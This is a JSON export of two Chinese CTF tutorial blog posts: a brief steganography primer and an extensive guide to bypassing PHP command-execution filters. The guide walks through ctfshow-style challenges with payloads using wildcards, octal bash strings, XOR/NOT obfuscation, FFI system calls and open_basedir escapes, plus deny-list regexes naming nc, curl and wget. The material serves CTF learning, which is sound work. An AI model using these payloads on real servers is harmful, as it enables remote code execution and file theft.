[{"title":"Misc打杂圣经","url":"/blog233.github.io/2024/09/21/Misc%E6%89%93%E6%9D%82%E5%9C%A3%E7%BB%8F/","content":"安全无止境，继续前进吧！\n为了更好地带领罗德岛的大家进行安全入门，我们开设了这个misc板块，这里罗列了一些信息隐藏的方式供大家参考学习，祝大家学有所成。–by Amiya\n\n玩转压缩包\n密码爆破 当密码比较简单时，在穷举法面前不堪一击；\n\n伪加密 篡改加密标识符，即便没有加密也打不开压缩包；\n\nCRC32碰撞\n\n明文攻击 当你拥有压缩包内原本的文件时，你可以通过将源文件压缩构造明文实施明文攻击解开它；\n\n\n神奇的图片\n宽高更改 更改图片宽高信息，使别人不能直接看到图片下方的区域； 务必注意：只有png图片能够实现这种隐写方式！\n\n盲水印 有些水印是肉眼看不见的，你需要排除一下图片花花绿绿的干扰；\n\n文件融合 使用copy命令可以实现文件两两融合，破解它需要用到binwalk；\n$ copy /b file1+file2 new_file$ binwalk -e new_file\n 如果融合的文件类型不一样，有时更改后缀名就可以发现端倪；\n\n网络迷踪 通过图片透露的所有细节，推测出图片的拍摄地点等信息，比较考验你的地理水平。\n\nSSTV 这是一种将图片以音频形式传播的一种手段，通常用于无线电传输， 使用MM-SSTV或者RX-SSTV就可以实现音频转图片了。\n\n各种二维码 常见的是使用二进制码转成二维码。除了二维码，还有一些不太常见的图片式编码，如：汉信码，条码等；\n\n\n文本隐写的N种芝士\nHEX隐写： 这种隐写方式属于比较直接的，使用HxD或者010Editor查看十六进制码即可，flag一般出现在末尾处；\n\n0宽隐写 利用不同字符所占据空间不同的特性，在长文本中夹杂一些简短的文本信息；\n\nSNOW隐写\n\nNTFS数据流（ADS） 病毒常玩套路之一。通过在文件后端插入隐形数据流，当文件被打开时，数据流同时被读取，悄无声息。\n\n\n\n　 　 　 　 　 　 　 　 ,　- ―――― - ､\n　　　　　　　　 ＿＿l　　　　　　　　　 　 ヽ 　 _　 -―‐ｧ\n　　　　　　 　 {　ｰ ､ ￣ ヽ-‐_,ﾆ二¨ ヽ　　 Y´.:.:.:.:.:.:.:./\n　　 　 　 　 ","categories":["Misc"]},{"title":"命令执行","url":"/blog233.github.io/2024/09/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"安全无止境，继续前进吧！\n罗德岛的PRTS依赖于强大的网络系统，相应地，网络安全尤为重要，这关乎全岛各项事务的正常运作，希望你能够以身作则，祝你好运。–by Kal’tsit\n\n绕过严格过滤命令执行，需要严格的过滤；攻击者需要想方设法绕过重重过滤\n敏感词汇过滤\n文件名&#x2F;扩展名过滤 使用*或?替换掉部分文件名和扩展名，前者可以替换掉一个字符，后者可以一次替换掉多个字符; 或者在词汇中间插入’’或者\\绕过检测；\n\n高级版文件名&#x2F;扩展名过滤 在第一个的基础上做了升级。比如要过滤关键词’tac’，凡是传入的参数当中按顺序出现了’t’’a’’c’这三个字符，参数就会被过滤； 此时第一个方法就不好用了，需要在省略部分字符的同时下加上路径&#x2F;bin&#x2F;，否则系统无法匹配命令；\n?file=/bin/cat index.php-&gt;?file=/bin/ca?$&#123;IFS&#125;?????.??? \n\n函数名过滤 当system被过滤时，使用echo `command`;执行系统命令； 如果echo也被过滤，使用nl命令（该命令无回显，需要手动查看网页源代码）；\n\n拼接法 通过构造与调用参数拼接敏感词汇，也能够绕过检测；\n?file=system(&#x27;ls&#x27;);-&gt;?file=$a=sys;$b=tem;$c=$a.$b;$c(&#x27;ls&#x27;);\n\n包含法 利用到了文件包含漏洞当中的filter包含，还挺好用（详解见：漏洞利用）；\n?file=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=index.php\n\n敏感字符过滤\n分号’;’过滤 使用%0a代替分号；\n\n空格’%20’过滤 在echo没有被过滤的情况下，使用$IFS（echo适用）或${IFS}代替空格； 如果echo被过滤，使用%09代替空格（%09是Tab键的url编码）； 如果$或{}或IFS被过滤，使用+代替空格（+会被解释成空格）； 此外，也可以获取并调用php环境中与空格等效的标识符；\n\n问号’?’过滤 使用不含问号的javascript语句构造PHP命令：\n?file=system(&#x27;ls&#x27;);-&gt;?file=&lt;script language=&#x27;php&#x27;&gt;system(&#x27;ls&#x27;);&lt;/script&gt;\n\n点’.’过滤 使用以下语句构造’.’：\npos(localeconv())chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))\n此外，还可以用句号’。’代替’.’\n\n\n全数字过滤利用Linux系统中的$(())构造数字：\n$&#123;_&#125; = &quot;&quot;  //返回上一次命令$(($&#123;_&#125;)) = 0$((~$(($&#123;_&#125;)))) = -1\n\n全字母过滤所有字母均被过滤时，考虑使用以下方法：\n\n通配符替换 使用’?’或’*‘替换字符，其中’?’一次只能替换一个字符，’*‘一次可以替换多个字符；\n\nbash无字母命令执行 使用$’\\num1\\num2\\……\\numn’替换传统命令（其中的num均为对应字符的ASCII码的八进制形式）；\n?file=tac flag.php-&gt;?file=$&#x27;\\164\\141\\143&#x27; $&#x27;\\146\\154\\141\\147\\56\\160\\150\\160&#x27;\n\n全数字、全字母过滤如果遇到了所有字母和数字都被过滤的极端情况，有以下几种方法绕过：\n\nphp异或 将系统命令异或处理后传入（需要保证密文和密钥的url解码结果均不包含字母和数字）；system(&#x27;ls&#x27;);-&gt;(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);system(&#x27;tac flag.php&#x27;);-&gt;(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);\nphp或 与异或相似，操作是差不多的；system(&#x27;ls&#x27;);-&gt;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);system(&#x27;tac flag.php&#x27;);-&gt;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;);\nphp自增PHP7.0.12以上版本不可用assert($_POST[_]);-&gt;$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);\nphp取反system(&#x27;ls&#x27;);-&gt;(~%8C%86%8C%8B%9A%92)(~%93%8C);system(&#x27;tac flag.php&#x27;);-&gt;(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);\n请注意：在Linux系统中，system()函数不支持以上操作！此外，当 $、+、-、^、~、|、% 这些字符被过滤后，以上方法将失效！\n\n举些例子（以下题目来自ctfshow）：&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感词汇过滤payload:    ?c=system(&#x27;ls&#x27;);    ?c=system(&#x27;tac fl*g.php&#x27;);\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感词汇过滤payload:    ?c=echo `ls`;    ?c=echo `tac fl*g.*`;       // 通配符    ?c=echo `tac fl?g.???`;     // 通配符    ?c=echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;  // 适用于*被过滤的情况，运行后无回显，需要手动查看源代码    拼接法：    ?c=$a=sys;$b=tem;$c=$a.$b;$c(&#x27;ls&#x27;);    ?c=$a=sys;$b=tem;$c=&quot;$&#123;a&#125;$&#123;b&#125;&quot;;$c(&#x27;tac fl*g.*&#x27;);\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);考点：敏感词汇过滤、敏感字符过滤payload:    ?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php&#125;\n&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感词汇过滤、敏感字符过滤payload:    ?c=tac&lt;fl&#x27;&#x27;ag.php||    ?c=ta&#x27;&#x27;c&lt;fl&#x27;&#x27;ag.php||  // 适用于&#x27;tac&#x27;被过滤的情况\n&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感字符过滤、全数字过滤解题思路：使用get_defined_vars(void)替代变量；    get_defined_vars(void)：返回一个包含所有已定义变量列表的多维数组，可以替代任意变量，这些变量包括环境变量、服务器变量和用户定义的变量。payload:    ?c=eval(next(reset(get_defined_vars())));&amp;1=system(&quot;ls&quot;);    ?c=eval(next(reset(get_defined_vars())));&amp;1=system(&quot;tac%20flag.php&quot;);\n&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：高级敏感词汇过滤、空格过滤、全数字过滤解题思路：通配符绕过、空格绕过payload:    ?c=/bin/ca?$&#123;IFS&#125;????.???\n&lt;?php// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：全字母过滤payload1:  // bash无字母命令执行    ?c=$&#x27;\\164\\141\\143&#x27; $&#x27;\\146\\154\\141\\147\\56\\160\\150\\160&#x27;payload2:  // 访问&quot;/bin/base64 flag.php&quot;，编码flag.php    ?c=/???/????64 ????.???    执行后，页面回显base64编码后的flag.php；注意：这个不是通用的,因为base64不是每个机器都有payload3:  // 访问&quot;/usr/bin/bzip2 flag.php&quot;，压缩flag.php    ?c=/???/???/????2 ????.???    执行后，访问url/flag.php.bz2即可下载压缩后的flag.php\n&lt;?php// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123;        system(&quot;cat &quot;.$c.&quot;.php&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：全数字过滤、全字母过滤解题思路：过滤了%，取反、异或、或不可用，使用$(())构造数字payload:    $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n&lt;?php#flag in http://192.168.7.68/flagif(isset($_GET[&#x27;url&#x27;]))&#123;    $url = $_GET[&#x27;url&#x27;];    $protocol = substr($url, 0,7);    if($protocol!=&#x27;http://&#x27;)&#123;        die(&#x27;仅限http协议访问&#x27;);    &#125;    if(preg_match(&#x27;/\\.|\\;|\\||\\&lt;|\\&gt;|\\*|\\%|\\^|\\(|\\)|\\#|\\@|\\!|\\`|\\~|\\+|\\&#x27;|\\&quot;|\\.|\\,|\\?|\\[|\\]|\\&#123;|\\&#125;|\\!|\\&amp;|\\$|0/&#x27;, $url))&#123;        die(&#x27;仅限域名地址访问&#x27;);    &#125;    system(&#x27;curl &#x27;.$url);&#125;考点：点过滤payload:    ?url=http://192。168。7。68/flag\n// RoarCTF2020-Web-badhack&lt;?phphighlight_file(__FILE__);class info&#123;    public $opcode;    public $rax;    public $rbx;    public $tmp;    public $flag;&#125;$stack = NULL;$opcode = array(893, 192, 9, 966, 64, 129, 573, 129, 2, 454, 193, 66, 573, 130, 7, 710, 66, 131, 445, 131, 8, 966, 131, 4, 701, 68, 6, 710, 196, 69, 893, 133, 9, 966, 197, 6, 573, 6, 11, 710, 198, 199, 445, 71, 10, 966, 135, 136, 573, 200, 4, 454, 8, 137, 829, 137, 11, 198, 201, 10, 957, 138, 12, 710, 74, 11, 701, 203, 4, 710, 139, 76, 829, 76, 7, 454, 204, 205, 445, 141, 7, 454, 77, 78, 573, 142, 10, 966, 142, 79, 765, 207, 4, 454, 207, 208, 701, 16, 3, 454, 208, 145, 509, 17, 9, 454, 145, 146, 1021, 82, 4, 966, 82, 83, 765, 147, 6, 966, 147, 212, 829, 84, 3, 198, 148, 149, 957, 213, 12, 454, 149, 86, 765, 22, 11, 454, 214, 215, 637, 87, 13, 198, 215, 88, 893, 152, 4, 198, 216, 89, 445, 217, 10, 966, 153, 218, 317, 218, 7, 710, 154, 155, 701, 155, 7, 710, 155, 92, 701, 156, 2, 966, 220, 93, 381, 157, 6, 454, 157, 94, 573, 222, 6, 454, 158, 223, 637, 223, 12, 966, 95, 96, 317, 96, 9, 710, 160, 97, 893, 33, 14, 454, 161, 226, 765, 226, 7, 454, 98, 35, 381, 99, 8, 710, 99, 228, 317, 164, 11, 710, 228, 165, 253, 37, 13, 966, 229, 230, 253, 166, 14, 710, 38, 39, 1021, 167, 12, 966, 103, 168, 957, 40, 4, 710, 168, 105, 701, 105, 7, 966, 105, 128, 701, 128, 13, 454, 64, 193, 509, 65, 8, 966, 193, 66, 637, 130, 12, 966, 194, 67, 317, 3, 10, 710, 131, 4, 1021, 68, 3, 966, 196, 133, 957, 5, 9, 710, 197, 134, 957, 6, 5, 966, 134, 71, 957, 7, 12, 710, 135, 136, 253, 136, 13, 454, 72, 137, 637, 73, 11, 454, 9, 10, 317, 202, 12, 710, 74, 11, 445, 139, 7, 966, 75, 204, 381, 204, 6, 454, 76, 205, 701, 77, 10, 198, 13, 14, 573, 14, 8, 710, 78, 15, 253, 79, 9, 710, 143, 80, 957, 208, 13, 966, 16, 145, 253, 17, 8, 454, 81, 82, 445, 18, 5, 710, 210, 147, 573, 147, 10, 198, 147, 84, 957, 84, 7, 454, 148, 213, 445, 149, 13, 454, 21, 214, 573, 150, 4, 710, 86, 87, 701, 215, 13, 454, 215, 24, 317, 152, 2, 454, 216, 153, 637, 89, 12, 454, 153, 154, 829, 218, 10, 710, 90, 155, 957, 91, 12, 198, 27, 92, 893, 92, 9, 454, 220, 93, 829, 221, 7, 454, 29, 158, 381, 222, 14, 710, 158, 95, 509, 159, 5, 454, 223, 224, 381, 224, 11, 710, 224, 33, 1021, 225, 7, 198, 161, 98, 573, 162, 13, 966, 98, 99, 509, 99, 7, 454, 163, 228, 509, 228, 13, 710, 36, 37, 573, 293, 11, 966, 165, 230, 381, 230, 5, 710, 166, 167, 957, 167, 14, 454, 39, 104, 317, 104, 6, 198, 40, 233, 637, 233, 10, 966, 233, 64, 999, 56, 78 );$idx = 0;function JudgeControl($op)&#123;    global $idx;    if($op-&gt;opcode == 999)    &#123;        return 9;    &#125;    if($idx == 6 &amp;&amp; $op-&gt;flag == 0)    &#123;        $op-&gt;rbx = 3;        $idx = 0;        return 7;    &#125;    else if($idx == 6 &amp;&amp; $op-&gt;flag != 0)    &#123;        $idx = 2;        return $idx;    &#125;    else    &#123;        while((($op-&gt;opcode &gt;&gt; $idx) &amp; 1) == 0)            $idx ++;        return $idx;    &#125;&#125;$PC = 0;$code = new info();$code-&gt;opcode = $opcode[$PC];$code-&gt;rax = $opcode[$PC + 1];$code-&gt;rbx = $opcode[$PC + 2];$code-&gt;tmp = $opcode[$PC + 1];$code-&gt;flag = 1;$cmd = $_GET[&#x27;cmd&#x27;];if(!is_array($cmd) || sizeof($cmd) !== 42)&#123;        die(&#x27;you are not bond 007&#x27;);&#125;$input = $cmd;$flag = 0;while(TRUE)&#123;    if($flag == 1)    &#123;        echo &quot;flag: &quot;.$flag;        break;    &#125;    $p = JudgeControl($code, $idx);    echo &quot;idx:&quot;.$idx.&quot;\\n&quot;;    echo &quot;opcode: &quot;.$code-&gt;opcode.&quot;\\n&quot;;    echo &quot;p: &quot;.$p.&quot;\\n&quot;;    if($p == 8) break;    switch($p)    &#123;        case 0:            $code-&gt;rax = $input[$code-&gt;rax % 64];            break;        case 1:            $code-&gt;rax = $input[$code-&gt;rax % 64];            $code-&gt;rbx = $input[$code-&gt;rbx % 64];            break;        case 2:            $stack = $code-&gt;rax ^ $code-&gt;rbx;            break;        case 3:            $code-&gt;rbx = $code-&gt;rax &amp; $code-&gt;rbx;            break;        case 4:            $code-&gt;rbx = $code-&gt;rbx &lt;&lt; 1;            $code-&gt;flag = $code-&gt;rbx;            break;        case 5:            $code-&gt;rax = $stack;        case 6:            $code-&gt;rax = $stack;            $input[$code-&gt;tmp % 64] = $code-&gt;rax % 256;            break;        case 7:            $PC += 3;            $code-&gt;opcode = $opcode[$PC];            $code-&gt;rax = $opcode[$PC + 1];            $code-&gt;rbx = $opcode[$PC + 2];            $code-&gt;tmp = $opcode[$PC + 1];            $code-&gt;flag = 1;            $idx = -1;            break;        case 9:            $flag = 1;            break;        default :            break;    &#125;    $idx ++;&#125;$cmd = &quot;&quot;;foreach ($input as $s) &#123;        $cmd .= chr($s);&#125;@eval($cmd);?&gt;考点：ASCII构造解题思路：    依据注释访问bond007.php，传参&#x27;cmd&#x27;；payload:    system(&#x27;ls&#x27;)    -&gt;?cmd[52]=115&amp;cmd[53]=121&amp;cmd[54]=115&amp;cmd[55]=116&amp;cmd[56]=101&amp;cmd[57]=109&amp;cmd[58]=40&amp;cmd[59]=39&amp;cmd[60]=108&amp;cmd[61]=115&amp;cmd[62]=39&amp;cmd[63]=41&amp;cmd[64]=59&amp;cmd[65]=47&amp;cmd[66]=42&amp;cmd[15]=100&amp;cmd[16]=100&amp;cmd[17]=100&amp;cmd[18]=100&amp;cmd[19]=100&amp;cmd[20]=100&amp;cmd[21]=100&amp;cmd[22]=100&amp;cmd[23]=100&amp;cmd[24]=100&amp;cmd[25]=100&amp;cmd[26]=100&amp;cmd[27]=100&amp;cmd[28]=100&amp;cmd[29]=100&amp;cmd[30]=100&amp;cmd[31]=100&amp;cmd[32]=100&amp;cmd[33]=100&amp;cmd[34]=100&amp;cmd[35]=100&amp;cmd[36]=100&amp;cmd[37]=100&amp;cmd[38]=100&amp;cmd[39]=100&amp;cmd[40]=100&amp;cmd[41]=100    system(&#x27;ls /&#x27;)    -&gt;?cmd[52]=115&amp;cmd[53]=121&amp;cmd[54]=115&amp;cmd[55]=116&amp;cmd[56]=101&amp;cmd[57]=109&amp;cmd[58]=40&amp;cmd[59]=39&amp;cmd[60]=108&amp;cmd[61]=115&amp;cmd[62]=32&amp;cmd[63]=47&amp;cmd[64]=39&amp;cmd[65]=41&amp;cmd[66]=59&amp;cmd[67]=47&amp;cmd[68]=42&amp;cmd[17]=100&amp;cmd[18]=100&amp;cmd[19]=100&amp;cmd[20]=100&amp;cmd[21]=100&amp;cmd[22]=100&amp;cmd[23]=100&amp;cmd[24]=100&amp;cmd[25]=100&amp;cmd[26]=100&amp;cmd[27]=100&amp;cmd[28]=100&amp;cmd[29]=100&amp;cmd[30]=100&amp;cmd[31]=100&amp;cmd[32]=100&amp;cmd[33]=100&amp;cmd[34]=100&amp;cmd[35]=100&amp;cmd[36]=100&amp;cmd[37]=100&amp;cmd[38]=100&amp;cmd[39]=100&amp;cmd[40]=100&amp;cmd[41]=100    system(&#x27;cat /f*&#x27;)    -&gt;?cmd[52]=115&amp;cmd[53]=121&amp;cmd[54]=115&amp;cmd[55]=116&amp;cmd[56]=101&amp;cmd[57]=109&amp;cmd[58]=40&amp;cmd[59]=39&amp;cmd[60]=99&amp;cmd[61]=97&amp;cmd[62]=116&amp;cmd[63]=32&amp;cmd[64]=47&amp;cmd[65]=102&amp;cmd[66]=42&amp;cmd[67]=39&amp;cmd[68]=41&amp;cmd[69]=59&amp;cmd[70]=47&amp;cmd[71]=42&amp;cmd[20]=100&amp;cmd[21]=100&amp;cmd[22]=100&amp;cmd[23]=100&amp;cmd[24]=100&amp;cmd[25]=100&amp;cmd[26]=100&amp;cmd[27]=100&amp;cmd[28]=100&amp;cmd[29]=100&amp;cmd[30]=100&amp;cmd[31]=100&amp;cmd[32]=100&amp;cmd[33]=100&amp;cmd[34]=100&amp;cmd[35]=100&amp;cmd[36]=100&amp;cmd[37]=100&amp;cmd[38]=100&amp;cmd[39]=100&amp;cmd[40]=100&amp;cmd[41]=100\n\n突破禁用函数命令执行，突破禁用函数；攻击者需要想方设法绕过重重限制\n函数调用一般POST突破，直接在POST里面调用函数并传入即可；\n查找路径：file=print_r(scandir(&quot;/&quot;));file=var_export(scandir(&quot;/&quot;));file=echo json_encode(glob(&#x27;../../../*&#x27;));读取目标文件：file=show_source(&#x27;flag.php&#x27;);file=highlight_file(&#x27;/flag.txt&#x27;);file=readgzfile(&#x27;/flag.txt&#x27;);file=require(&#x27;/flag.txt&#x27;);file=require_once(&#x27;/flag.txt&#x27;);file=include(&#x27;/flag.txt&#x27;);\n\n拦截跳出如果不想执行后续代码，避免输出缓冲区被劫持过滤，可以在命令末尾处添加以下两种功能函数：\n\n提前送出缓冲区；ob_flush();ob_end_flush();\n提前终止程序；exit(0);die(0);\n\nglob伪协议如果存在open_basedir配置的限制，常规的PHP访问函数被限制或禁用，使用glob协议绕过open_basedir的限制：\nfile=?&gt;&lt;?php $a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;\n\n连接数据库如果存在include_path限制，文件包含路径受限，无法直接使用include()包含文件得到flag信息，使用以下方式连接MySQL数据库访问flag：\n\nPDO连接；file=try&#123;    $dbh = new PDO(&#x27;mysql: host = localhost; dbname = ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);    foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag.txt&quot;)&#x27;) as $row)    &#123;        echo($row[0]).&quot;|&quot;;    &#125;    $dbh = null;&#125;catch (PDOException $e)&#123;    echo $e-&gt;getMessage();    exit(0);&#125;exit(0);\n回环地址连接；file=$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;);$sql = &quot;select load_file(&#x27;/flag.txt&#x27;) as a&quot;;$row = mysqli_query($conn, $sql);while($result = mysqli_fetch_array($row))&#123;    echo $result[&#x27;a&#x27;];&#125;exit(0);\n\nFFI（仅限于PHP7.4及以上版本）PHP外部函数接口特性，用于实现高级语言之间的互相调用；使用FFI::cdef()函数定义我们需要调用的函数的原型：\nFFI::cdef([string $cdef = &quot;&quot; [, string $lib = null]]): FFI\n这里引入例题web77（本题未开源，故不放上源代码，仅展示payload）：\nfile=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);   // 创建一个system对象$a=&#x27;/readflag &gt; flag.txt&#x27;;    // 此步无回显$ffi-&gt;system($a);    // 通过$ffi去调用system函数访问url/flag.txt即可获取flag；\n\n举些例子&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123;        $c= $_POST[&#x27;c&#x27;];        eval($c);        $s = ob_get_contents();  // 获取缓冲区的数据        ob_end_clean();  // 清除缓冲区的内容并将缓冲区关闭，但不会输出内容        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);  // 全字母、全数字过滤&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;你要上天吗？payload1:    c=echo json_encode(glob(&#x27;../../../*&#x27;))ob_flush();    c=include(&#x27;/flag.txt&#x27;);ob_flush();payload2:    c=print_r(scandir(&quot;/&quot;));exit(0);    c=include(&#x27;/flag.txt&#x27;);exit(0);\n// CISCN国赛_Web_simple_php&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);error_reporting(0);if(isset($_POST[&#x27;cmd&#x27;]))&#123;    $cmd = escapeshellcmd($_POST[&#x27;cmd&#x27;]);      if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\\?|wget|\\&#x27;|\\&quot;|id|whoami/i&#x27;, $cmd)) &#123;         system($cmd);&#125;&#125;show_source(__FILE__);?&gt;解题思路：    1. 利用php -r执行命令，注意绕过过滤；    2. flag不在目录当中，此时一般在数据库中，需要执行sql语句查询；    3. 使用十六进制编码绕过关键词过滤；payload:    cmd=php -r eval(hex2bin(substr(_echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7;&#x27;`,1)));    -&gt;cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));\n\nBash内置变量利用Bash内置变量构造命令执行语句；\n&lt;- To be continued  _(:3 ∠)__\n  く__,.ヘヽ.        /  ,ー､ 〉\n           ＼ ', !-─‐-i  /  /´\n           ／｀ｰ'       L/／｀ヽ､\n         /   ／,   /|   ,   ,       ',\n       ｲ   / /-‐/  ｉ  L_ ﾊ ヽ!   i\n        ﾚ ﾍ 7ｲ｀ﾄ   ﾚ'ｧ-ﾄ､!ハ|   |\n          !,/7 '0'     ´0iソ|    |\n          |.从\"    _     ,,,, / |./    |\n          ﾚ'| i＞.､,,__  _,.イ /   .i   |\n            ﾚ'| | / k_７_/ﾚ'ヽ,  ﾊ.  |\n              | |/i 〈|/   i  ,.ﾍ |  i  |\n             .|/ /  ｉ：    ﾍ!    ＼  |\n              kヽ>､ﾊ    _,.ﾍ､    /､!\n              !'〈//｀Ｔ´', ＼ ｀'7'ｰr'\n              ﾚ'ヽL__|___i,___,ンﾚ|ノ\n                  ﾄ-,/  |___./\n                  'ｰ'    